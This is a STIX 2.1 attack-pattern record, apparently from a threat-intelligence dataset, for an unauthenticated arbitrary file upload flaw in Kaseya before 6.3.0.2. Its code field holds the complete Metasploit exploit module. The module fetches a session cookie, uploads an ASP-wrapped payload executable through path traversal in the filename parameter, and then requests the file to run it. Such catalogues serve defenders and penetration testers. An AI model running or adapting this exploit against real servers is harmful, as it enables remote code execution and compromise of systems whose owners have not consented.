{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d88a7f45-bf33-459a-9890-b667afdb2cfe",
    "created": "2024-08-14T16:53:45.026451Z",
    "modified": "2024-08-14T16:53:45.026455Z",
    "name": "Kaseya uploadImage Arbitrary File Upload",
    "description": " This module exploits an arbitrary file upload vulnerability found in Kaseya versions below 6.3.0.2. A malicious user can upload an ASP file to an arbitrary directory without previous authentication, leading to arbitrary code execution with IUSR privileges. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/kaseya_uploadimage_file_upload.rb",
            "external_id": "kaseya_uploadimage_file_upload.rb"
        },
        {
            "source_name": "reference",
            "url": "http://security-assessment.com/files/documents/advisory/Kaseya%20File%20Upload.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Kaseya uploadImage Arbitrary File Upload',\n      'Description'    => %q{\n        This module exploits an arbitrary file upload vulnerability found in Kaseya versions below\n        6.3.0.2. A malicious user can upload an ASP file to an arbitrary directory without previous\n        authentication, leading to arbitrary code execution with IUSR privileges.\n      },\n      'Author'         =>\n        [\n          'Thomas Hibbert <thomas.hibbert@security-assessment.com>' # Vulnerability discovery and MSF module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['OSVDB', '99984'],\n          ['BID', '63782'],\n          ['EDB', '29675'],\n          ['URL', 'http://security-assessment.com/files/documents/advisory/Kaseya%20File%20Upload.pdf']\n        ],\n      'Platform'       => 'win',\n      'Arch'           => ARCH_X86,\n      'Privileged'     => false,\n      'Targets'        =>\n        [\n          [ 'Kaseya KServer / Windows', {} ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-11-11'))\n  end\n\n  def check\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri('SystemTab','uploadImage.asp')\n    })\n\n    # the vuln was patched by removing uploadImage.asp. if the page is there, calling it without params will return 500, else 404\n    unless res and res.code == 500\n      return Exploit::CheckCode::Unknown\n    end\n\n    return Exploit::CheckCode::Appears\n  end\n\n  def exploit\n    print_status(\"Getting cookie...\")\n    res = send_request_cgi({\n       'method' => 'GET',\n       'uri'    => normalize_uri(\"SystemTab\", \"uploadImage.asp\")\n    })\n\n    unless res and res.code == 500 and res.headers and res.headers.include?('Set-Cookie')\n      fail_with(Failure::Unknown, \"#{peer} - Failed to get cookie\")\n    end\n\n    cookie = res.get_cookies\n    @payload_name = \"#{rand_text_alpha_lower(8)}.asp\"\n    exe  = generate_payload_exe\n    asp  = Msf::Util::EXE.to_exe_asp(exe)\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(asp, \"application/octet-stream\", nil, \"form-data; name=\\\"uploadFile\\\"; filename=\\\"#{@payload_name}\")\n    data = post_data.to_s\n\n    print_status(\"Uploading payload...\")\n    res = send_request_cgi({\n      \"method\" => \"POST\",\n      \"uri\"    => normalize_uri(\"SystemTab\", \"uploadImage.asp\"),\n      \"vars_get\" => {\n        \"filename\" => \"..\\\\..\\\\..\\\\..\\\\#{@payload_name}\"\n      },\n      \"data\"   => data,\n      \"ctype\"  => \"multipart/form-data; boundary=#{post_data.bound}\",\n      \"cookie\" => cookie\n    })\n\n    unless res and res.code == 200\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Upload failed\")\n    end\n\n    register_files_for_cleanup(@payload_name)\n\n    print_status(\"Executing payload #{@payload_name}\")\n    res = send_request_cgi({\n      'uri'    => normalize_uri(@payload_name),\n      'method' => 'GET'\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-11-11",
    "x_mitre_platforms": [
        "win'"
    ]
}